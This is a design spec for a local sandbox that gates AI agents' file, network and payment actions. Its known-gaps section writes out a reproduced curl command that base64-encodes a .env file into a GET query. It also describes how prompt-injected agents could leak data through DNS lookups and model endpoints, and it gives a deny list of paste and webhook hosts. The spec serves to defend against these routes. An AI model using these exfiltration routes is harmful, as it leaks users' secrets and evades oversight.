---
title: barebox PRD
description: The current barebox spec. Problem and goal, how the rwx gate and modes work, signed-off decisions, the M8-M15 reliability plan, the post-hackathon feedback items, and known gaps.
---

# barebox PRD

barebox (CLI `sbx`) is a lightweight local sandbox for AI agents (docs/archive/agent-sandbox-prd.md:9-26). It was built for a hackathon that is now over; the product goes on (docs/archive/agent-sandbox-prd.md:39-41, 713-715).

## 1. Problem and goal

Agents need real access to be useful: shell, files, network. Developers today pick one of two bad options (docs/archive/agent-sandbox-prd.md:13-16).

- Approve everything. People stop reading the prompts, or switch them off.
- Heavy isolation. Docker or a VM: images, a daemon, root, and no installed toolchain. Most people skip it.

The risk is not spread evenly. Reads are mostly harmless. File writes can be fixed. Only a few actions can't be undone: paying, sending, publishing, pushing (docs/archive/agent-sandbox-prd.md:18).

Existing lightweight sandboxes, such as Anthropic's sandbox-runtime (srt), block well but cost about 100 MB per sandbox. Each one starts its own proxy. That does not scale to many agents on a small machine (docs/archive/agent-sandbox-prd.md:20).

**Goal.** A local sandbox with guardrails and two jobs: damage control (mistakes and prompt-injected agents) and governance (who may do what, with an audit log) (docs/archive/agent-sandbox-prd.md:24).

One line: an agent runs on your machine with your real tools, every write is undoable, and nothing leaves the machine without passing a doorman. You are asked only when something irreversible is about to happen (docs/archive/agent-sandbox-prd.md:26).

**Priorities, in order** (docs/archive/agent-sandbox-prd.md:28-33):
1. Low memory. Primary.
2. Local or a cheap VPS. Never needs a cloud. Zero cost.
3. Many agents per machine. One shared proxy, many thin sandboxes. Not a cluster.
4. Cross-platform. Later.

**First users.** Solo devs and small teams who want control and freedom at zero cost. barebox is free, local and lightweight, and built to connect to many tools. It is not for swarms or thousands of agents (docs/archive/agent-sandbox-prd.md:35-37).

**Is** a strong guardrail against mistakes and prompt-injected agents. No root, no daemon, no image (docs/archive/agent-sandbox-prd.md:45).

**Isn't** a security boundary against a determined attacker. The kernel is shared, so a kernel exploit escapes. Use a VM for that (docs/archive/agent-sandbox-prd.md:46).

## 2. How it works

Three letters, each handled differently. They are the same letters as rwxmap and bareguard (docs/archive/agent-sandbox-prd.md:50-56).

| Letter | Meaning | What the sandbox does | You're asked? |
|---|---|---|---|
| r | reads, changes nothing | lets it through (except locked paths) | never |
| w | changes things, can be set back | records it on an undo layer | once, at the end (review the diff) |
| x | can't be undone: send, pay, publish, push, delete remote | holds it at the door until you decide | at the moment it happens |

The agent works in your house (docs/archive/agent-sandbox-prd.md:58-62):

1. Tracing paper (w). The agent sees the real files. Every change lands on a layer over them. At the end you commit it or roll it back.
2. Locked drawers (r). It reads most things. Some can't be opened: `~/.ssh`, `~/secrets`, browser profiles, password stores.
3. One front door with a doorman (x). The agent has no network of its own. The doorman waves lookups through and holds anything that sends, pays or publishes until you say yes.

### Picture

The agent process (real node, python, git) runs in an unprivileged bwrap sandbox. Files are an overlay: lower is the real project (read only), upper is the per-run layer. Locked paths show an empty tmpfs. The network is none of its own; `socat` inside forwards `127.0.0.1:3128` to a per-agent unix socket, and the connection is the agent's identity. That socket reaches one shared proxy (Node, in-process rwxmap and bareguard): r is forwarded, x is held for the human then forwarded or refused with 403, and a request with no label becomes `http.<METHOD>` and the rwx file gives its letter (docs/archive/agent-sandbox-prd.md:66-82).

### The doorman's x-rules, strongest first

The proxy sees requests, not intent, and sites use `POST` for both searching and paying. So `GET = r, POST = x` is too crude (docs/archive/agent-sandbox-prd.md:86).

1. **Card data in the body: the floor.** Any 13-19 digit number that passes Luhn, or a CVV/expiry field, sets a `cardLike` mark. It asks in every mode, `trust` included. Nothing is denied because of a card. Bodies over 64 KB are not checked (known gap) (docs/archive/agent-sandbox-prd.md:88).
2. **Payment destinations: the floor.** Known payment domains and paths such as `/checkout`, `/payment`, `/orders`, `/purchase` set a payment-path mark that asks in every mode (docs/archive/agent-sandbox-prd.md:89).
3. **Known APIs: rwxmap labels.** For example, search = r, create order = x (docs/archive/agent-sandbox-prd.md:90).
4. **Everything else.** `GET`/`HEAD` = r. Any other method without a label = x (bareguard's rule: "unsure? tag it x"). The request goes to the gate as `http.<METHOD>` (docs/archive/agent-sandbox-prd.md:91).

Rules 3-4 give the letter. Rules 1-2 are the floor and hold in every mode. The idea note's "personal data leaving" rule is out of scope (docs/archive/agent-sandbox-prd.md:93).

### Modes (decided Oct 27)

One flag, three values, read like `chmod`. The mode decides only what happens to each letter (docs/archive/agent-sandbox-prd.md:95-97).

| Mode | r | w | x | Floor (card, payment) | Closest Claude Code mode |
|---|---|---|---|---|---|
| `ask` | pass | ask | ask | ask | default |
| `auto` (default) | pass | pass | ask | ask | acceptEdits |
| `trust` | pass | pass | pass, logged | ask | bypassPermissions |

(docs/archive/agent-sandbox-prd.md:99-103)

- Why rwx, not tool types: barebox sees only HTTP requests, so it classifies by consequence (can this be undone?). That is the vocabulary bareguard and rwxmap already use (docs/archive/agent-sandbox-prd.md:105).
- File writes are not in this table. They land on the overlay in every mode and are reviewed once at the end (`diff`, then `commit` or `rollback`) (docs/archive/agent-sandbox-prd.md:106).
- A read-only mode (Claude Code's `plan`) is a bareguard rwx ceiling of `"r--"`: w and x are denied without asking. It works by passing a gate and is not a fourth built-in mode (docs/archive/agent-sandbox-prd.md:107).

### Capability without custody

The agent never holds the card or API keys. It types a placeholder, and the proxy puts the real value in only after the human approves that request. In v1 this works for request headers only (docs/archive/agent-sandbox-prd.md:111).

## 5. Decisions

Signed off by the user (docs/archive/agent-sandbox-prd.md:292).

| Area | Decision |
|---|---|
| Platforms | Linux first. macOS and Windows (via WSL2, which reuses the Linux build) come after (docs/archive/agent-sandbox-prd.md:296). |
| Stack | Node. bareguard (action gate: allow / ask / deny + audit log) runs in-process in the proxy as the one production dependency. rwxmap is never imported: its labels arrive as bareguard rwx config. mitmproxy (Python) is dropped (docs/archive/agent-sandbox-prd.md:297). |
| Policy engine (Oct 27) | Two gateways, one channel. Default: barebox builds a bareguard `Gate` from the mode. Or pass `gate`: a loop's existing bareguard `Gate`, or any object with the same `check(action)` contract. Matched by shape, never `instanceof` (docs/archive/agent-sandbox-prd.md:298). |
| Ask channel (Oct 27) | One file checkpoint in the runtime dir: `asks/<id>.json` to `answers/<id>.json`. Agents, loops and humans answer it the same way; `sbx pending/approve/deny` is a thin reader/writer over it. The runtime dir is masked from the sandbox, so an agent cannot answer its own ask (docs/archive/agent-sandbox-prd.md:299). |
| Modes (Oct 27) | `ask` / `auto` (default) / `trust`, with the card and payment floor in every mode (docs/archive/agent-sandbox-prd.md:300). |
| Audit (Oct 27) | One JSONL file in bareguard's line shape (`phase`, `decision`, `rule`, `run_id`, `agent`, `ts`), shared with the gate's audit. barebox adds transport lines only. Created `0600`, redacted with bareguard's `secrets` redaction (docs/archive/agent-sandbox-prd.md:301). |
| Suite reuse (Oct 27) | When a bare-suite library's primitive is missing or wrong, the fix goes into that library, not a wrapper here. A temporary adapter is allowed only with an upstream issue link and a condition for deleting it (docs/archive/agent-sandbox-prd.md:302). |
| Walls | Our own thin walls on bubblewrap, not srt (docs/archive/agent-sandbox-prd.md:303). |
| Dropped for v1 | Landlock and custom seccomp. bwrap's isolation is enough for a guardrail. They can return later (docs/archive/agent-sandbox-prd.md:304). |
| Undo layer (Linux) | bwrap overlay. Lower = real project, read-only. Upper = per-run layer. Commands: diff, commit, rollback (docs/archive/agent-sandbox-prd.md:305). |
| Approvals | The M2 POC used a second-terminal CLI over a unix socket. Superseded Oct 27 by the file-checkpoint channel; `sbx pending/approve/deny` keeps its commands. Timeout means deny. No web UI (docs/archive/agent-sandbox-prd.md:306). |
| Governance v1 | Single operator, one mode (or one gate) per agent, one audit log (docs/archive/agent-sandbox-prd.md:307). |
| Secrets v1 | Injected in request headers only, after approval. A placeholder sits inside the sandbox. Body placeholder swap (for example `{{CARD}}`) is not v1 (docs/archive/agent-sandbox-prd.md:308). |
| Locked paths (M0) | 21 credential stores; see `LOCKED_PATHS` in `src/launcher.js`. `~/.claude` stays readable until M5 (docs/archive/agent-sandbox-prd.md:310). |
| Browser agents + Jev; localhost | Browsers out of v1; Demo A uses an API. Localhost sockets are blocked entirely by the net namespace (docs/archive/agent-sandbox-prd.md:309, 311). |
| API surface | The `sbx` CLI plus programmatic APIs for spawning sandboxed workflows (docs/archive/agent-sandbox-prd.md:313). |

### Why own walls (option B)

| | srt (measured) | Own walls (measured) |
|---|---|---|
| Memory per sandbox | ~100 MB (Node 82 + socat ~12 + bash ~8) | ~8 MB (socat 4.1 + walls peak ~3.8) |
| Proxy | one per sandbox | one shared |
| 20 agents | ~2 GB | ~234 MB rough sum (~78 MB proxy + 20 x 7.8 MB, rewrite bench) |
| Blocks work | yes | yes |

(docs/archive/agent-sandbox-prd.md:317-323)

Memory is priority 1, and the per-sandbox proxy is the cost. The walls are a launcher of about 50 lines. srt stays as prior art. Ideas borrowed from it: an async per-request filter, credential masking, and `node-forge` for certificates (which must pass the dependency checklist) (docs/archive/agent-sandbox-prd.md:325-329). The cost: barebox owns the walls code and its upkeep (docs/archive/agent-sandbox-prd.md:331).

## 9. Later: reliability modules M8-M15 (order decided Nov 10)

Goal: as few holes as possible for the same scope (a solo developer or small team, up to 40 agents per proxy, lightweight, quick to spawn). The order follows what each module needs from the one before, then how widely the hole leaks: a hole open in every mode comes before one open only in `trust`. Each module runs the usual way: POC on its riskiest assumption, tests shown red then green, full suite 3x, bench, a real `sbx run`. The feedback items a1-a4 and b1-b5 map onto these modules (docs/archive/agent-sandbox-prd.md:715-717).

| Module | What | Needs | Closes |
|---|---|---|---|
| M8. Upstream bump | bareguard 0.30.0 to 0.34.0, rwxmap 0.8.0 to 0.11.1, read both changelogs first; pinned exactly. | nothing | Starts every later module on current upstream, so its tests are not redone after a bump. |
| M9. Decide before resolve | DNS only after the gate decides; for CONNECT, after the first request in the tunnel is decided (b1). | M8 | Data in a hostname leaking even when the request is denied, in every mode. Every egress rule below depends on it. |
| M10. Egress: hosts allowlist and first-contact ask | See "M10 design" below (b3, b4). | M9 | Data in a GET to a host you never chose, in every mode. |
| M11. URL data check | A long query or path, or a long base64/hex run, asks in every mode, thresholds sized from real traffic first (b2). | M10 | Bulk data in a GET to a host you did allow. A backstop for M10, not the main fix. |
| M12. Model calls | A model endpoint passes free only with the run's own secret placeholder, else `x`. | M9 | Model APIs as an open channel with any key, an attacker's included, in every mode. |
| M13. Pay and send always ask | The floor gains a `sendLike` mark (email and messaging send endpoints) and payment API hosts on any path; the question names recipient, amount and currency from the request body (a1-a4). | M8 | Emails and messages free in `trust`; payment hosts off the four path fragments. |
| M14. Floor gaps | Card scan in gzip bodies; a model API labelled `r` skips the card scan like the built-in ones. | M13 | Small floor gaps (section 10). |
| M15. Letter accuracy | rwxlite as the classifier; see "M15 open question" below. | M8 | Wrong letters for APIs without a label: `POST` reads that ask, `GET` actions that write. Does not close a leak. |

(docs/archive/agent-sandbox-prd.md:719-728)

Then the fix ledger goes through `/refactor`: a Node install dir containing the runtime, `--hold` missing from `sbx run --help` for unattended runs, and the rest (docs/archive/agent-sandbox-prd.md:730).

### M10 design (decided Nov 10, user)

- Hosts live in the one config file under `hosts`, Claude-style (docs/archive/agent-sandbox-prd.md:733-740):

```json
"hosts": {
  "allow": ["registry.npmjs.org", "*.github.com", "pypi.org"],
  "deny":  ["*.pastebin.com", "webhook.site"]
}
```

- `deny` is checked before DNS and refuses in every mode. `allow` means the host never gets a first-contact ask and its reads pass. It does not make `x` free: a `POST` to an allowed host keeps its letter and mode. The floor (pay, send, cards) can never be allowed away (docs/archive/agent-sandbox-prd.md:742).
- A host on neither list gets a first-contact ask with three answers: allow once, allow always (the host is added to `hosts.allow`, so later runs skip the ask), or deny. The config folder is masked inside the sandbox, so the agent can neither read nor write the list (docs/archive/agent-sandbox-prd.md:743).
- With no `hosts` key, the first-contact ask still runs. There is no default allow list beyond the model endpoints and secret-bound hosts, which never ask on first contact (docs/archive/agent-sandbox-prd.md:744).
- Open: which default hosts, if any, ship in `hosts.allow` (docs/archive/agent-sandbox-prd.md:744).
- Open: whether `x` and floor asks also offer "allow always". Proposed: no. A floor ask is never remembered, and an `x` ask offers allow once or deny only, so a remembered answer can never turn a send or a payment free (docs/archive/agent-sandbox-prd.md:745).

### M15 open question (Nov 10)

rwxlite is a small classifier (0.3.1 on npm, 132 KB, no dependencies) that letters an API operation from its spec text (docs/archive/agent-sandbox-prd.md:747). Two ways to use it:

- (a) Through rwxmap: rwxmap uses rwxlite at label-build time, and barebox keeps reading rwxmap labels. Keeps the runtime dependency rule (bareguard and rwxmap only) (docs/archive/agent-sandbox-prd.md:748).
- (b) On its own: barebox calls rwxlite per request and drops rwxmap. This changes the runtime dependency rule. rwxlite reported (Nov 3) that it reads only spec operation text, never live URLs or bodies; lettering from method plus path alone is untested (docs/archive/agent-sandbox-prd.md:749).
- POC before deciding: letter the same requests both ways (Demo A, Demo B, a real Claude Code run) and compare against hand labels, plus the per-request cost in ms (docs/archive/agent-sandbox-prd.md:750).

### Not sorted into the M8-M15 order

| Item | Note |
|---|---|
| macOS walls | `sandbox-exec` profile plus APFS clone (`cp -c`) for undo. No Mac available; needs a test machine (borrowed Mac or macOS CI runner). About 1-1.5 days. |
| Windows | Via WSL2. A test run of the Linux build. |
| Body placeholder swap | For cards, for example `{{CARD}}` in a form body. |
| Per-step snapshots | Per-step undo of the upper layer. |
| Phone push approvals | |
| Landlock / seccomp hardening | |
| GraphQL / gRPC parsing | |
| Llama end-of-run summary | Plain-language summary of the diff and audit log, flags off-task changes; model output treated as untrusted. Optional. |
| Go proxy rewrite | Verdict below. |
| URL data check (parked Nov 3) | Closes the bulk case of "data in a GET" (section 10). A mark like `cardLike`: a request whose query or path is longer than N bytes, or holds an unbroken base64/hex run of M+ characters, asks in every mode (a mark only adds an ask, so no bareguard change). Sizing first: set N and M from real traffic, using the Demo A audit plus a Claude Code `sbx run` audit, and list the longest legitimate URLs (signed S3 links, OAuth redirects, page cursors). The test must show the `base64 .env` GET red today, asking after, and a Claude Code run with zero new asks. It does not stop data sent in small pieces; docs say "large data in a URL asks", not "closed". Estimate about half a day. |
| First-contact host ask plus DNS after the gate | Closes the small-pieces case: the first request to a host new in this run asks (in `ask` and `auto`; model endpoints and secret-bound hosts exempt). Needs "DNS resolves before the gate" (section 10) fixed first, or a hostname leaks before the ask. |
| Model call key check | Model endpoints go free only with the run's own secret placeholder, else `x` (section 10). |
| Letter accuracy (rwxmap with rwxlite) | Replaces "letter by method" for APIs with a spec: POST reads and AWS-style `?Action=` GETs (rwxlite, Nov 3: label recipe 98.5% on GETs, 93% on POSTs; model not yet evaluated; TF-IDF baseline about 1.5 ms per call). Spec-only: no help for hosts without a spec or body-dependent RPC (GraphQL, JSON-RPC). Does not close the leaks. |

(docs/archive/agent-sandbox-prd.md:753-769)

**Go verdict, verbatim** (docs/archive/agent-sandbox-prd.md:798-800):

> Verdict: Node, with no real contest. Go wins on memory and shipping. Node wins on reuse, and that reuse turns out to be large. Go could come back later as a rewrite of just the proxy, if measurements ever show memory is the bottleneck.

## Next: post-hackathon feedback (decided Nov 5)

Build order is the M8-M15 table above (docs/archive/agent-sandbox-prd.md:773). Two pieces of public feedback (Nov 4-5, recorded in `docs/logs/findings.md`) set the order of work (docs/archive/agent-sandbox-prd.md:775):

- **(a) Strengthen the floor.** "Forcing payments and emails to always prompt for confirmation is a must-have safety feature", so pay and send ask in every mode.
- **(b) Fix the read channel.** For an agent the risky bucket is often `r`, not `x`; a prompt injection can turn a GET into exfiltration.

(a) goes first because it extends a mechanism that exists (marks). (b) needs proxy work (docs/archive/agent-sandbox-prd.md:775).

### (a) Pay and send always ask (the floor)

Today the floor is a card number in a body of 64 KB or less, or one of four payment path fragments. An email is `x`: it asks in `ask` and `auto` and goes out free in `trust` (Demo A's email was held only because the run was in `auto`) (docs/archive/agent-sandbox-prd.md:777).

| # | Item | Spec |
|---|---|---|
| a1 | Send floor | A `sendLike` mark asks in every mode, `trust` included, for known email and messaging send endpoints, matched by host and path from a short built-in list (for example SendGrid `/v3/mail/send`, Mailgun `/messages`, Postmark `/email`, Amazon SES `SendEmail`, Resend `/emails`, Gmail `users.messages.send`, Slack `chat.postMessage` and `hooks.slack.com`, Discord webhooks, Twilio `Messages`). Extendable from the one config file. A mark only adds an ask, so no bareguard change. SMTP and other non-HTTP traffic stay denied. Sizing first: list the endpoints the demos and a real Claude Code run actually hit. |
| a2 | Payment domains | The same mark mechanism for known payment API hosts (Stripe, PayPal, Adyen, Square and similar), on any path. Closes "Payment domains are not built" (section 10). |
| a3 | Exact effect in the question | For a floor ask, the question names the recipient, amount and currency read from the request body (`to`, `amount`, `currency` and the vendor's equivalents), not from anything the agent says. Today it shows method, URL and a masked 4 KB preview. |
| a4 | Proof | Tests: each mark asks in `trust`, shown red against today's code. Demo A and Demo B gain a cell: the email asks in `trust`. |

(docs/archive/agent-sandbox-prd.md:779-784)

### (b) Fix the read channel

In order, because each depends on the one before (docs/archive/agent-sandbox-prd.md:786):

| # | Item | Spec |
|---|---|---|
| b1 | DNS after the gate | Resolve only after the gate decides; for CONNECT, after the first request in the tunnel is decided (section 10). Without it, b3 still leaks a hostname before the ask. |
| b2 | URL data check | A long query or path, or a long base64/hex run, asks in every mode. Thresholds sized from real traffic first (spec in the "Not sorted" table above). |
| b3 | First-contact host ask | The first request to a host new in this run asks, an allowlist built as you go. |
| b4 | Egress allowlist | Superseded Nov 10 by the M10 design above: the list lives under the `hosts` config key (`allow` and `deny`), and a host on neither list gets the first-contact ask instead of a deny (docs/archive/agent-sandbox-prd.md:733-746, 793). |
| b5 | Say what is not covered | README Known limits gains one plain sentence: until b1-b3 land, injected instructions that only read and send data out through URLs are not covered in any mode. Docs only; can ship before the code. |

(docs/archive/agent-sandbox-prd.md:788-794)


Also noted from the feedback, not scheduled: scope a secret per tool (rwxmap operation), not only per host. Every swap is already logged (`verdict: "secret"`, no value) (docs/archive/agent-sandbox-prd.md:796).

## 10. Known gaps

- **Writes over sockets escape the overlay.** A local Postgres or Docker daemon is not a file (docs/archive/agent-sandbox-prd.md:804).
- **Commit conflicts.** If the user edits the same files during a run, the undo layer flags the conflict. It does not merge (docs/archive/agent-sandbox-prd.md:805).
- **Held requests can time out on the server side.** Holding happens before forwarding, so only the agent's client waits (docs/archive/agent-sandbox-prd.md:806).
- **Card numbers in bodies over 64 KB are not checked.** Such bodies stream through with the normal letter and mode decision. Checking and denying them would break large uploads, because random 16-digit ids pass Luhn about 1 time in 10 (docs/archive/agent-sandbox-prd.md:807).
- **API keys or passwords inside a body still appear in the 4 KB preview** (ask file only; the audit file holds no preview). Card numbers are masked. bareguard's redaction covers common token shapes once it lands. barebox builds no scrubber of its own (docs/archive/agent-sandbox-prd.md:808).
- **Payment domains are not built** (fix: a2). Only the four path fragments ask as the payment floor; a request to a known payment domain on any other path is decided by its letter and the mode (docs/archive/agent-sandbox-prd.md:809).
- **Held bodies add up on disk.** Each agent has one parked body of up to 50 MB (`heldBodyMaxMB`) in `<runtime>/held`, so 40 agents can hold 2 GB; the runtime defaults to a temp dir, often a RAM-backed tmpfs. There is no total cap. The proxy memory budget (about 205-245 MB over HTTPS, set Nov 2, replacing 145-175 MB) does not count it (docs/archive/agent-sandbox-prd.md:810).
- **Certificate pinning breaks inspection.** Out of scope (docs/archive/agent-sandbox-prd.md:811).
- **Data in a GET leaves free in every mode (found Nov 3, reproduced).** `r` is free by design, but the URL carries data to any host that resolves: in `ask` mode, `curl "https://httpbin.org/anything/pixel.gif?d=$(base64 .env)"` delivered the file with 0 asks. Demo B's attacker host is `attacker.invalid`, refused only as unresolvable, so it never covered this. Options considered: ask on first contact with a new host per run; treat a large or high-entropy query as `x`; a free-read host list with the rest asking in `ask`. Decided Nov 3 (user): known limit for the hackathon release. Nov 5 (user): next after the floor work. The first-contact option needs the DNS fix below (docs/archive/agent-sandbox-prd.md:812).
- **DNS resolves before the gate (found Nov 3, code-verified, not observed on the wire).** `checkUpstream` resolves the hostname on arrival (`src/proxy.js:666` for plain HTTP, `:943` at CONNECT), before the gate decides. Data encoded in a hostname reaches the attacker's name server even when the request is then held or denied, in every mode. Fix: decide first, resolve after; for CONNECT, resolve when the first request in the tunnel is decided. Decided Nov 3 (user): known limit for the hackathon release; the fix is planned after it (docs/archive/agent-sandbox-prd.md:813).
- **Model endpoints are an open channel.** Built-in model endpoints and a model API labelled `r` go out free in every mode with any key, an attacker's included. Ledger since Nov 2. Fix idea: free only when the call carries the run's own secret placeholder, else `x` (docs/archive/agent-sandbox-prd.md:814).
- **A model API labelled `r` is still card-scanned** (found Nov 3). Only the built-in endpoints and `localLlm` skip the card floor (`modelTools`). With a card number anywhere in the conversation, every later call to a labelled model API (Baseten in Demo A) is held (docs/archive/agent-sandbox-prd.md:815).
- **A Node install dir that contains the runtime shows `asks/` and other agents' sockets inside** (ledger, reproduced Nov 1). Rare layout. Fix: refuse such a runtime, or mask it under the Node bind (docs/archive/agent-sandbox-prd.md:816).
- **Better letters do not close these leaks.** A request classifier (rwxmap labels, or the rwxlite model in training) makes `r`/`w`/`x` more accurate per operation and can mark payment APIs. It cannot fix the leaks above: a GET carrying data is still a read, a model call is still `r`, and DNS order, the `~/.claude` mask and the Node bind are not about letters. Those need policy or proxy changes (docs/archive/agent-sandbox-prd.md:817).
- **The proxy sees traffic, not intent.** Every API needs a mapping. File edits and local stdio MCP servers never touch the network; the undo layer and locked paths cover files. An MCP server running outside the sandbox with its own credentials is a hole (docs/archive/agent-sandbox-prd.md:818).
